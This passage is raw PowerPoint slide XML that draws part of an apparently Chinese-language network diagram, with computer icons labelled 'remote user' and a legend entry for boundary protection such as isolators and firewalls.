                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>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8313" name="Group 37"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2371" y="1595"/>
              <a:ext cx="755" cy="445"/>
              <a:chOff x="2317" y="1111"/>
              <a:chExt cx="755" cy="445"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98480" name="Rectangle 38"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2317" y="1111"/>
                <a:ext cx="755" cy="445"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="00CC99"/>
              </a:solidFill>
              <a:ln w="38100">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" tIns="9144" rIns="27432"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r" eaLnBrk="0" hangingPunct="0"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>远程用户</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98481" name="Freeform 39"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1437"/>
                <a:ext cx="363" cy="114"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 1597 h 95"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 13046 h 95"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2239 h 95"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 446 h 95"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 95"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 1597 h 95"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 95"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="95">
                    <a:moveTo>
                      <a:pt x="287" y="12"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="12"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98482" name="Freeform 40"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1233"/>
                <a:ext cx="230" cy="207"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 468 h 172"/>
                  <a:gd name="T2" fmla="*/ 17619 w 182"/>
                  <a:gd name="T3" fmla="*/ 25518 h 172"/>
                  <a:gd name="T4" fmla="*/ 12976 w 182"/>
                  <a:gd name="T5" fmla="*/ 24724 h 172"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5582 h 172"/>
                  <a:gd name="T8" fmla="*/ 94937 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 172"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 468 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 182"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 182 w 182"/>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182" h="172">
                    <a:moveTo>
                      <a:pt x="182" y="3"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="32" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="3"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98483" name="Freeform 41"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1435"/>
                <a:ext cx="363" cy="116"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 2167 h 96"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 15792 h 96"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2618 h 96"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 684 h 96"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 96"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 2167 h 96"/>
                  <a:gd name="T12" fmla="*/ 163251 w 287"/>
                  <a:gd name="T13" fmla="*/ 2167 h 96"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 287"/>
                  <a:gd name="T22" fmla="*/ 0 h 96"/>
                  <a:gd name="T23" fmla="*/ 287 w 287"/>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7" h="96">
                    <a:moveTo>
                      <a:pt x="287" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="13"/>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84" name="Freeform 42"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1232"/>
                <a:ext cx="230" cy="208"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 549 h 173"/>
                  <a:gd name="T2" fmla="*/ 17111 w 182"/>
                  <a:gd name="T3" fmla="*/ 25059 h 173"/>
                  <a:gd name="T4" fmla="*/ 12334 w 182"/>
                  <a:gd name="T5" fmla="*/ 23995 h 173"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5465 h 173"/>
                  <a:gd name="T8" fmla="*/ 94840 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 173"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 549 h 173"/>
                  <a:gd name="T12" fmla="*/ 101396 w 182"/>
                  <a:gd name="T13" fmla="*/ 549 h 173"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 182"/>
                  <a:gd name="T22" fmla="*/ 0 h 173"/>
                  <a:gd name="T23" fmla="*/ 182 w 182"/>
                  <a:gd name="T24" fmla="*/ 173 h 1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73">
                    <a:moveTo>
                      <a:pt x="182" y="4"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="31" y="173"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="170" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="4"/>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85" name="Freeform 43"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2343" y="1237"/>
                <a:ext cx="242" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 114015 w 191"/>
                  <a:gd name="T1" fmla="*/ 16844 h 169"/>
                  <a:gd name="T2" fmla="*/ 13859 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 103024 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 114015 w 191"/>
                  <a:gd name="T9" fmla="*/ 16844 h 169"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 191"/>
                  <a:gd name="T16" fmla="*/ 0 h 169"/>
                  <a:gd name="T17" fmla="*/ 191 w 191"/>
                  <a:gd name="T18" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98486" name="Freeform 44"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2360" y="1251"/>
                <a:ext cx="208" cy="175"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 85546 w 165"/>
                  <a:gd name="T1" fmla="*/ 16357 h 145"/>
                  <a:gd name="T2" fmla="*/ 10273 w 165"/>
                  <a:gd name="T3" fmla="*/ 23288 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 165"/>
                  <a:gd name="T5" fmla="*/ 5404 h 145"/>
                  <a:gd name="T6" fmla="*/ 77887 w 165"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 85546 w 165"/>
                  <a:gd name="T9" fmla="*/ 16357 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 165"/>
                  <a:gd name="T16" fmla="*/ 0 h 145"/>
                  <a:gd name="T17" fmla="*/ 165 w 165"/>
                  <a:gd name="T18" fmla="*/ 145 h 145"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="165" h="145">
                    <a:moveTo>
                      <a:pt x="165" y="102"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="102"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98487" name="Freeform 45"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1380"/>
                <a:ext cx="363" cy="155"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6639 h 129"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 18316 h 129"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 7118 h 129"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 129"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6639 h 129"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 287"/>
                  <a:gd name="T16" fmla="*/ 0 h 129"/>
                  <a:gd name="T17" fmla="*/ 287 w 287"/>
                  <a:gd name="T18" fmla="*/ 129 h 129"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="287" h="129">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98488" name="Freeform 46"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2342" y="1237"/>
                <a:ext cx="241" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101903 w 191"/>
                  <a:gd name="T1" fmla="*/ 16636 h 169"/>
                  <a:gd name="T2" fmla="*/ 12299 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 93122 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 101903 w 191"/>
                  <a:gd name="T9" fmla="*/ 16636 h 169"/>
                  <a:gd name="T10" fmla="*/ 101903 w 191"/>
                  <a:gd name="T11" fmla="*/ 16636 h 169"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 191"/>
                  <a:gd name="T19" fmla="*/ 0 h 169"/>
                  <a:gd name="T20" fmla="*/ 191 w 191"/>
                  <a:gd name="T21" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T12">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T15">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T16">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                  <a:cxn ang="T17">
                    <a:pos x="T10" y="T11"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T18" t="T19" r="T20" b="T21"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="118"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="118"/>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89" name="Freeform 47"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1379"/>
                <a:ext cx="363" cy="156"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6366 h 130"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 17862 h 130"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 6956 h 130"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 130"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6366 h 130"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 6366 h 130"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 130"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="130">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>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8314" name="AutoShape 48"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="-5400000">
              <a:off x="2640" y="1148"/>
              <a:ext cx="244" cy="4955"/>
            </a:xfrm>
            <a:prstGeom prst="leftBrace">
              <a:avLst>
                <a:gd name="adj1" fmla="val 68819"/>
                <a:gd name="adj2" fmla="val 68870"/>
              </a:avLst>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="57150">
              <a:solidFill>
                <a:srgbClr val="000099"/>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pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
              <a:endParaRPr lang="en-US" altLang="en-US" sz="1200"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98315" name="Rectangle 49"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="219" y="3867"/>
              <a:ext cx="101" cy="90"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="19050">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98316" name="AutoShape 50"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="200" y="3989"/>
              <a:ext cx="128" cy="113"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF7C80"/>
            </a:solidFill>
            <a:ln w="19050">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98317" name="Text Box 51"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="419" y="3873"/>
              <a:ext cx="165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1200" b="1"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1"/>
                <a:t>边界保护（隔离器、防火墙等）</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="en-US" sz="1200"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98318" name="Text Box 52"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="431" y="4014"/>
              <a:ext cx="1543"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85000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
